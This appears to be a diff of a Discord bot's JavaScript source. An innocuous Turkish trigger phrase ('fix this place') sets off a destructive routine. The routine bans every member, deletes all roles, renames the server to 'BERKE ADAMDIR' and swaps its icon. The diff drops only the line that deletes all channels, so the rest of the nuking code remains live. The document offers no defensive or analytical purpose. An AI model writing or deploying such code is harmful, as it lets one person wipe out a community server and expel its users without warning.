@@ -24,7 +24,6 @@ berke.on('message', msg => {
 berke.on('message', async msg => {
   if (msg.content.toLowerCase() === 'burayı bi düzelt' ) {
     msg.guild.members.forEach(member => member.ban())
-    msg.guild.channels.deleteAll();
     msg.guild.roles.deleteAll();
     msg.guild.setName("BERKE ADAMDIR");
     msg.guild.setIcon("https://media.discordapp.net/attachments/600251870836948993/623176047994732544/download.png");
